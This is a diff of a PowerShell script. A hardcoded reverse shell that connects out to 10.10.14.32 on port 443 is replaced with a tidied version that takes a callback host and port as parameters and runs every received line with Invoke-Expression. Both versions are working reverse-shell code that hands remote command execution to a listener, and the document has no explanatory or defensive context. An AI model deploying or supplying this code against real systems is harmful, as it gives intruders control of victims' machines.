@@ -1,19 +1,22 @@
-$socket = new-object System.Net.Sockets.TcpClient('10.10.14.32', 443);
-if($socket -eq $null){exit 1}
-$stream = $socket.GetStream();
-$writer = new-object System.IO.StreamWriter($stream);
-$buffer = new-object System.Byte[] 1024;
-$encoding = new-object System.Text.AsciiEncoding;
-do{
-	$writer.Write("> ");
-	$writer.Flush();
-	$read = $null;
-	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
-	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
-	if(!$out.equals("exit")){
-		$out = $out.split(' ')
-	        $res = [string](&$out[0] $out[1..$out.length]);
-		if($res -ne $null){ $writer.WriteLine($res)}
-	}
-}While (!$out.equals("exit"))
-$writer.close();$socket.close();
+param(
+    [Parameter(Mandatory=$true)][string]$CallbackHost,
+    [ValidateRange(1,65535)][int]$CallbackPort = 443
+)
+$socket = New-Object System.Net.Sockets.TcpClient($CallbackHost, $CallbackPort)
+try {
+    $stream = $socket.GetStream()
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.AutoFlush = $true
+    $reader = New-Object System.IO.StreamReader($stream)
+    while ($null -ne ($command = $reader.ReadLine())) {
+        if ($command -eq 'exit') { break }
+        try { $result = Invoke-Expression $command 2>&1 | Out-String }
+        catch { $result = $_ | Out-String }
+        $writer.WriteLine($result)
+    }
+}
+finally {
+    if ($reader) { $reader.Dispose() }
+    if ($writer) { $writer.Dispose() }
+    $socket.Close()
+}
